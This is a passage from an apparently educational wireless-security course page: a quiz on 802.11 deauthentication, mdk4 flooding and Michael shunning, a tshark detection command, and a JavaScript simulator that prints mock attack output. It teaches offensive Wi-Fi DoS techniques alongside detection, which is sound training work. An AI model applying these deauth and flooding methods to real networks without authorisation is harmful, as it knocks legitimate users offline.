            <button class="option-btn" onclick="answer(this,'q3',true)">It fills the AP's station association table with fake MACs — consumer APs support ~100-256 entries. When full, legitimate clients receive "AP busy" and cannot associate</button>
            <button class="option-btn" onclick="answer(this,'q3',false)">It exhausts DHCP IP address pool so new clients get no IP address</button>
            <button class="option-btn" onclick="answer(this,'q3',false)">It floods the AP with beacon responses until its radio resets</button>
          </div>
          <div class="quiz-feedback" id="fb-q3"></div>
        </div>

        <!-- Q4 -->
        <div class="quiz-question" id="q4">
          <div class="q-num">Question 4 of 8</div>
          <div class="q-text">What does reason code 7 in a deauthentication frame indicate, and how can you use it for detection?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q4',false)">The client voluntarily disconnected — no attack indicator</button>
            <button class="option-btn" onclick="answer(this,'q4',true)">Reason 7 = "Class 3 frame from non-associated STA" — the default code used by aireplay-ng. Seeing many reason-7 deauths from a single non-AP MAC is a strong indicator of injection</button>
            <button class="option-btn" onclick="answer(this,'q4',false)">The AP is rebooting — common during firmware updates</button>
            <button class="option-btn" onclick="answer(this,'q4',false)">WPA3 SAE handshake was rejected — client needs to reconnect with correct credentials</button>
          </div>
          <div class="quiz-feedback" id="fb-q4"></div>
        </div>

        <!-- Q5 -->
        <div class="quiz-question" id="q5">
          <div class="q-num">Question 5 of 8</div>
          <div class="q-text">In the mdk4 deauth amok mode, what does the <code>-w whitelist.txt</code> flag do?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q5',false)">It adds WPA2 tags to the deauth frames to bypass PMF</button>
            <button class="option-btn" onclick="answer(this,'q5',true)">It specifies a list of MAC addresses that should NOT be deauthenticated — used to protect specific clients (e.g., your own devices) from the DoS</button>
            <button class="option-btn" onclick="answer(this,'q5',false)">It sets the channel whitelist — only deauth on channels listed in the file</button>
            <button class="option-btn" onclick="answer(this,'q5',false)">It writes attack output to a log file named whitelist.txt</button>
          </div>
          <div class="quiz-feedback" id="fb-q5"></div>
        </div>

        <!-- Q6 -->
        <div class="quiz-question" id="q6">
          <div class="q-num">Question 6 of 8</div>
          <div class="q-text">Michael shunning (mdk4 mode <code>m</code>) only works against which type of network and why?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q6',false)">WPA2-CCMP — because CCMP uses Michael MIC for integrity</button>
            <button class="option-btn" onclick="answer(this,'q6',true)">WPA-TKIP only — because the Michael algorithm is specific to TKIP's MIC implementation. WPA2-CCMP uses AES-CCMP which has no Michael countermeasure</button>
            <button class="option-btn" onclick="answer(this,'q6',false)">WEP networks — because Michael replaces CRC-32 in WEP</button>
            <button class="option-btn" onclick="answer(this,'q6',false)">WPA3-SAE only — because SAE uses the same MIC derivation</button>
          </div>
          <div class="quiz-feedback" id="fb-q6"></div>
        </div>

        <!-- Q7 -->
        <div class="quiz-question" id="q7">
          <div class="q-num">Question 7 of 8</div>
          <div class="q-text">In a Scapy deauth script, why send deauth frames in BOTH directions — AP→Client AND Client→AP?</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q7',false)">Both directions are needed to satisfy 802.11w MIC requirements</button>
            <button class="option-btn" onclick="answer(this,'q7',true)">Sending AP→Client disconnects the client from the AP's perspective; sending Client→AP disconnects the AP's association with the client. Both ensure neither party believes the connection is valid</button>
            <button class="option-btn" onclick="answer(this,'q7',false)">The AP direction captures the handshake; the client direction prevents re-association</button>
            <button class="option-btn" onclick="answer(this,'q7',false)">It's not necessary — one direction is sufficient for a successful deauth</button>
          </div>
          <div class="quiz-feedback" id="fb-q7"></div>
        </div>

        <!-- Q8 -->
        <div class="quiz-question" id="q8">
          <div class="q-num">Question 8 of 8</div>
          <div class="q-text">Write the tshark command to identify which source MAC is sending the most deauthentication frames in a capture file.</div>
          <div class="option-list">
            <button class="option-btn" onclick="answer(this,'q8',false)"><code>tcpdump -r cap.pcapng type mgt subtype deauth | sort | uniq -c</code></button>
            <button class="option-btn" onclick="answer(this,'q8',false)"><code>tshark -r cap.pcapng -Y "eapol" -T fields -e wlan.sa | sort | uniq -c | sort -rn</code></button>
            <button class="option-btn" onclick="answer(this,'q8',true)"><code>tshark -r cap.pcapng -Y "wlan.fc.type_subtype==12" -T fields -e wlan.sa | sort | uniq -c | sort -rn</code></button>
            <button class="option-btn" onclick="answer(this,'q8',false)"><code>tshark -r cap.pcapng -Y "wlan.fc.subtype==12" -T fields -e wlan.bssid | sort -u</code></button>
          </div>
          <div class="quiz-feedback" id="fb-q8"></div>
        </div>

        <div class="quiz-score" id="quizScore">
          <div class="score-num" id="scoreNum">0/8</div>
          <div class="score-label" id="scoreLabel"></div>
        </div>
      </div>
    </section>

    <!-- Nav -->
    <div class="nav-footer">
      <a href="../module-07-wpa2-cracking/" class="nav-btn prev">&#8592; Module 07: WPA2 Cracking</a>
      <a href="../module-09-evil-twin/" class="nav-btn next">Module 09: Evil Twin &#8594;</a>
    </div>
  </main>
</div>

<script>
  // Copy terminal
  function copyTerm(btn, id) {
    const el = document.getElementById(id);
    const text = el.innerText || el.textContent;
    navigator.clipboard.writeText(text.trim()).then(() => {
      btn.textContent = 'Copied!';
      btn.classList.add('copied');
      setTimeout(() => { btn.textContent = 'Copy'; btn.classList.remove('copied'); }, 2000);
    });
  }

  // ── Quiz ──────────────────────────────────────────────────────
  const TOTAL_Q = 8;
  const qAnswered = {};
  const qFeedbacks = {
    q1: {
      correct: "Correct. Deauthentication drops a client to State 1 (Unauthenticated, Unassociated). From State 1, the client must go through: Authentication Request/Response → State 2, then Association Request/Response → State 3, triggering a full WPA2 4-way handshake. This is exactly why deauth enables handshake capture.",
      wrong: "Incorrect. Deauthentication drops to State 1 (not State 2). From State 1, the client must re-authenticate AND re-associate — performing a new 4-way handshake. Disassociation drops to State 2, requiring only re-association."
    },
    q2: {
      correct: "Correct. 802.11w/PMF protects management frames (type=0) specifically deauth (subtype 12) and disassoc (subtype 10). The NAV Duration/ID field is in the MAC header of ALL frame types — including data and control frames. PMF has no scope to protect this field.",
      wrong: "Incorrect. 802.11w only encrypts and authenticates deauthentication and disassociation management frames. The Duration/ID field in the 802.11 MAC header is present in ALL frames including data frames — PMF cannot protect it."
    },
    q3: {
      correct: "Correct. mdk4's auth flooding mode sends thousands of Association Requests from random spoofed MACs. Consumer APs maintain a finite station table (typically 64-256 entries). When full, new legitimate clients are rejected with association denial — effectively a DoS without touching existing sessions.",
      wrong: "Incorrect. mdk4 auth mode exhausts the AP's station association table — a finite table that maps client MACs to session state. When all table slots are filled with fake MACs, legitimate clients cannot associate. This is different from CPU exhaustion."
    },
    q4: {
      correct: "Correct. Reason code 7 = 'Class 3 frame received from non-associated STA' — this is the default reason code injected by aireplay-ng --deauth. Legitimate AP deauths use codes 1, 2, or 3. Seeing many reason-7 deauths from a non-AP source MAC is a reliable injection indicator for IDS rules.",
      wrong: "Incorrect. Reason code 7 is 'Class 3 frame from non-associated STA' — the default code used by aireplay-ng. Legitimate AP deauths typically use code 1 (unspecified) or 2 (auth no longer valid). Code 7 from an unknown source is a reliable injection signature."
    },
    q5: {
      correct: "Correct. -w whitelist.txt tells mdk4 to skip deauthenticating any MAC listed in the file. This is useful in authorized engagements to protect specific devices (e.g., your own testing equipment or critical infrastructure) from the DoS while still attacking the target.",
      wrong: "Incorrect. In mdk4, -w specifies a whitelist file — MAC addresses that will NOT be deauthenticated. The -b flag is the blacklist (ONLY target these MACs). The -w flag is an exclusion list to protect specific devices."
    },
    q6: {
      correct: "Correct. Michael is the MIC algorithm in TKIP (WPA-TKIP). TKIP's Michael countermeasure mandates: if 2 MIC failures occur within 60 seconds, the AP locks out all TKIP traffic for 60 seconds. WPA2-CCMP uses AES-CCMP for integrity — no Michael algorithm, no shunning countermeasure.",
      wrong: "Incorrect. Michael shunning targets WPA-TKIP only. The Michael algorithm is the integrity check used in TKIP. WPA2-CCMP replaced both RC4/TKIP and Michael with AES-CCMP, which has no built-in 'shunning' countermeasure — it's immune to this specific attack."
    },
    q7: {
      correct: "Correct. In 802.11, both the AP and the client maintain their own state machine. Sending only AP→Client deauth may disconnect the client, but the AP still thinks the client is associated. Sending both directions ensures both sides clear the association — preventing the AP from sending unicast data to the now-disconnected client.",
      wrong: "Incorrect. Sending deauth in both directions ensures complete state cleanup: AP→Client (client clears its association state) and Client→AP (AP clears its record of the client). With only one direction, one party may still think the connection is valid, causing issues."
    },
    q8: {
      correct: "Correct. wlan.fc.type_subtype==12 filters deauthentication frames. -T fields -e wlan.sa extracts source MAC addresses. sort | uniq -c | sort -rn sorts by frequency (highest first). The MAC with the largest count is the attacker injecting deauth frames.",
      wrong: "Incorrect. The correct command uses wlan.fc.type_subtype==12 (deauth filter), -e wlan.sa (source MAC), and sort | uniq -c | sort -rn (frequency sort). tcpdump's filter syntax for frame subtypes is different and less reliable. EAPOL filter shows handshake frames, not deauths."
    }
  };

  let qScore = 0;
  let qCount = 0;

  function answer(btn, qId, isCorrect) {
    if (qAnswered[qId]) return;
    qAnswered[qId] = true;
    qCount++;
    const qEl = document.getElementById(qId);
    const buttons = qEl.querySelectorAll('.option-btn');
    buttons.forEach(b => b.disabled = true);
    const fb = document.getElementById('fb-' + qId);
    if (isCorrect) {
      btn.classList.add('correct');
      qScore++;
      fb.textContent = '✓ ' + qFeedbacks[qId].correct;
      fb.className = 'quiz-feedback correct-fb show';
    } else {
      btn.classList.add('wrong');
      fb.textContent = '✗ ' + qFeedbacks[qId].wrong;
      fb.className = 'quiz-feedback wrong-fb show';
      buttons.forEach(b => { if (b.onclick && b.onclick.toString().includes('true')) b.classList.add('correct'); });
    }
    if (qCount === TOTAL_Q) {
      const scoreEl = document.getElementById('quizScore');
      const numEl = document.getElementById('scoreNum');
      const labelEl = document.getElementById('scoreLabel');
      numEl.textContent = qScore + '/' + TOTAL_Q;
      const pct = qScore / TOTAL_Q;
      labelEl.textContent = pct === 1 ? 'Perfect — ready for Module 09!' : pct >= 0.75 ? 'Strong — review missed questions.' : pct >= 0.5 ? 'Getting there — re-read the mdk4 modes and PMF bypass sections.' : 'Re-read the state machine, mdk4, NAV DoS, and detection sections.';
      numEl.style.color = pct === 1 ? 'var(--accent2)' : pct >= 0.625 ? 'var(--warn)' : 'var(--accent3)';
      scoreEl.classList.add('show');
    }
  }

  // Deauth simulation
  function runDeauthSim() {
    const attack = document.getElementById('attackType').value;
    const count = document.getElementById('frameCount').value;
    const output = document.getElementById('simOutput');

    output.innerHTML = '<span class="sim-spinner">⟳</span> Starting attack...';

    setTimeout(() => {
      let lines = [];
      
      if (attack === 'broadcast') {
        lines.push('<span style="color:var(--accent2)">[✓]</span> Sending broadcast deauth to AA:BB:CC:DD:EE:FF');
        lines.push('<span style="color:var(--text-dim)">Frames sent: ' + (count === '0' ? 'continuous' : count) + '</span>');
        
        setTimeout(() => {
          if (count === '0') {
            lines.push('<span style="color:var(--accent3)">[+]</span> Client 11:22:33:44:55:66 disconnected');
            lines.push('<span style="color:var(--accent3)">[+]</span> Client 22:33:44:55:66:77 disconnected');
            lines.push('<span style="color:var(--accent3)">[+]</span> Client 33:44:55:66:77:88 disconnected');
            lines.push('');
            lines.push('<span style="color:var(--warn)">DoS active - clients cannot reconnect</span>');
          } else {
            lines.push('<span style="color:var(--accent2)">[✓]</span> ' + count + ' deauth frames sent');
            lines.push('<span style="color:var(--accent2)">[✓]</span> Clients disconnected and reconnecting...');
            lines.push('');
            lines.push('<span style="color:var(--accent2)">Attack complete - handshake captured</span>');
          }
          output.innerHTML = lines.join('\n');
        }, 1200);
        
      } else if (attack === 'targeted') {
        lines.push('<span style="color:var(--accent2)">[✓]</span> Targeting client 11:22:33:44:55:66');
        lines.push('<span style="color:var(--text-dim)">Sending ' + (count === '0' ? 'continuous' : count) + ' frames...</span>');
        
        setTimeout(() => {
          lines.push('<span style="color:var(--accent3)">[+]</span> Target client disconnected');
          lines.push('');
          lines.push('<span style="color:var(--accent2)">Targeted client affected, others unaffected</span>');
          output.innerHTML = lines.join('\n');
        }, 1000);
        
      } else {
        lines.push('<span style="color:var(--accent2)">[✓]</span> mdk4 beacon flood started');
        lines.push('<span style="color:var(--text-dim)">Flooding with fake APs...</span>');
        
        setTimeout(() => {
          lines.push('<span style="color:var(--warn)">[+]</span> Fake APs: 50');
          lines.push('<span style="color:var(--warn)">[+]</span> Fake APs: 100');
          lines.push('<span style="color:var(--warn)">[+]</span> Fake APs: 150');
          lines.push('');
          lines.push('<span style="color:var(--accent3)">Network saturated - clients cannot find real AP</span>');
          output.innerHTML = lines.join('\n');
        }, 1500);
      }
      
      output.innerHTML = lines.join('\n');
    }, 500);
  }
</script>
</body>
</html>
